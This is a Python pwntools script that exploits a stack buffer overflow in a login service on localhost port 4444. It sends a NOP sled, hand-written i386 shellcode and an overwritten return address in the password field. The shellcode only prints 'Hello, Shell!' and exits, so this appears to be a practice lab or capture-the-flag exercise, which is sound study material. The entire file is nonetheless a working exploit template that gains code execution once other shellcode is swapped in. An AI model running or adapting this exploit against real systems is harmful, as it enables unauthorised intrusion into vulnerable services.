from pwn import *

context.update(arch='i386', os='linux')
r = remote('127.0.0.1', 4444)

r.recvuntil(b"Username: ")
r.sendline(b"bob")

r.recvuntil(b"Password: ")

offset = 76
shellcode = asm('''
    xor    eax, eax                /* clear eax (we’ll use it for zero and syscall numbers) */
    xor    ebx, ebx                /* clear ebx (we’ll use it for exit code and later stdout fd) */
    push   eax                     /* push a 0 dword to serve as string terminator */

    mov    dword ptr [esp],     0x6c6c6548   /* write "Hell" at [esp] */
    mov    dword ptr [esp+4],   0x53202c6f   /* write "o, S" at [esp+4] */
    mov    dword ptr [esp+8],   0x6c6c6568   /* write "hell" at [esp+8] */
    mov    byte  ptr [esp+12],  0x21         /* write '!' at [esp+12] */

    mov    ecx, esp               /* ecx = pointer to our string */
    mov    edx, 13                /* edx = length of "Hello, Shell!" */
    mov    ebx, 1                 /* ebx = file descriptor 1 (stdout) */
    mov    al, 4                  /* al = syscall number 4 (sys_write) */
    int    0x80                   /* invoke kernel: write(1, esp, 13) */

    xor    ebx, ebx               /* ebx = 0 (exit code) */
    mov    al, 1                  /* al = syscall number 1 (sys_exit) */
    int    0x80                   /* invoke kernel: exit(0) */
''')


nop_sled = b'\x90' * (offset - len(shellcode))
pre_eip = nop_sled + shellcode

ret_addr = p32(0xffffc750)       # GDB: 0xffffc790     Non-GDB: 0xffffc810
payload = pre_eip + ret_addr

r.send(payload)
r.close()
